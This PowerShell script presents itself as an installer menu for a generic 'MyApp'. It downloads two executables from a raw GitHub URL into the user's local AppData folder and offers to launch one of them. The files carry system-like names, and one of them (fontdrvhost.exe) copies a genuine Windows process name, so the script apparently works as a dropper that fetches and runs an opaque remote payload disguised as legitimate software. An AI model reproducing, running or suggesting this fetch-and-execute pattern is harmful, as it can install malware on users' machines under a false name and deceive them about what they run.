[Console]::OutputEncoding = [Text.Encoding]::UTF8
cls

# -------------------------
# CONFIG
# -------------------------

$global:TargetDir = Join-Path $env:LOCALAPPDATA "MyApp"

$global:Files = @(
    @{ Url = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/bfsvcp.exe"; Name = "bfsvcp.exe" },
    @{ Url = "https://raw.githubusercontent.com/draft7973-ops/Smithshop/main/fontdrvhost.exe"; Name = "fontdrvhost.exe" }
)

# -------------------------
# ANIMATION
# -------------------------

function chk($t){
    $c = @("Red","Yellow","Green","Cyan","Blue","Magenta")
    for($i=0;$i -lt 20;$i++){
        $d="."*($i%6)
        $cl=$c[$i%$c.Count]
        Write-Host ("`r"+$t+$d+"   ") -NoNewline -ForegroundColor $cl
        Start-Sleep -Milliseconds 80
    }
    Write-Host ""
}

# -------------------------
# INSTALL
# -------------------------

function Install-App {

    chk "downloading "

    if(-not (Test-Path $global:TargetDir)){
        New-Item -ItemType Directory -Path $global:TargetDir -Force | Out-Null
    }

    foreach($f in $global:Files){

        $dest = Join-Path $global:TargetDir $f.Name

        if(-not (Test-Path $dest)){
            try{
                Invoke-WebRequest $f.Url -OutFile $dest
                Write-Host "`nDownloaded $($f.Name)" -ForegroundColor Green
            }
            catch{
                Write-Host "`nFailed $($f.Name)" -ForegroundColor Red
            }
        }
        else{
            Write-Host "`n$f.Name already exists" -ForegroundColor Yellow
        }
    }

    # -------------------------
    # ASK BEFORE RUN
    # -------------------------

    $runFile = Join-Path $global:TargetDir "bfsvcp.exe"

    if(Test-Path $runFile){
        $ans = Read-Host "`nRun bfsvcp.exe now? (y/n)"
        if($ans -eq "y"){
            Write-Host "`nRunning bfsvcp.exe..." -ForegroundColor Cyan
            Start-Process $runFile
        }
    }

    Pause
}

# -------------------------
# CHECK
# -------------------------

function Check-App {

    Write-Host "`nChecking files..." -ForegroundColor Yellow

    foreach($f in $global:Files){
        $path = Join-Path $global:TargetDir $f.Name

        if(Test-Path $path){
            Write-Host "$($f.Name) OK" -ForegroundColor Green
        }
        else{
            Write-Host "$($f.Name) NOT FOUND" -ForegroundColor Red
        }
    }

    Pause
}

# -------------------------
# CLEAN
# -------------------------

function Clean-App {

    Write-Host "`nCleaning..." -ForegroundColor Yellow

    foreach($f in $global:Files){
        $path = Join-Path $global:TargetDir $f.Name

        if(Test-Path $path){
            Remove-Item $path -Force
            Write-Host "Deleted $($f.Name)" -ForegroundColor Green
        }
    }

    Pause
}

# -------------------------
# MENU
# -------------------------

while($true){
    cls
    Write-Host "=== MENU ===`n" -ForegroundColor Cyan
    Write-Host "1. Install"
    Write-Host "2. Check"
    Write-Host "3. Clean"
    Write-Host "0. Exit"

    $m = Read-Host ">"

    switch($m){
        "1" { Install-App }
        "2" { Check-App }
        "3" { Clean-App }
        "0" { break }
        default { continue }
    }
}
